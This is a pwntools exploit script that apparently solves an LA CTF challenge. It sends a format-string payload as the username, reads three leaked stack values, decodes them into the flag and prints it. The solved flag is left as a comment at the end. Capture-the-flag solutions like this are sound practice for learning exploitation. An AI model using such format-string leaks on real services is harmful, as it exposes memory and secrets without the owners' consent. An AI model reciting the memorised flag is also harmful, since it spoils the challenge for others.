from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    b *(main+381)
    continue
''')

# p = remote('chall.lac.tf', 31142)

# leak flag on stack using format string
p.sendlineafter(b"username: ", b'%6$p%7$p%8$p')
p.sendlineafter(b"password1: ", b"A")
p.sendlineafter(b"password2: ", b"A")
p.recvuntil(b"Incorrect password for user ")
leak = p.recvline().strip()
flag_hex = [int(leak[0:18], 16), int(leak[18:36], 16), int(leak[36:54], 16)]
flag = ''.join(struct.pack('<Q', val).decode('ascii') for val in flag_hex)
print(flag)

p.interactive()

# lactf{hunter2_cfc0xz68}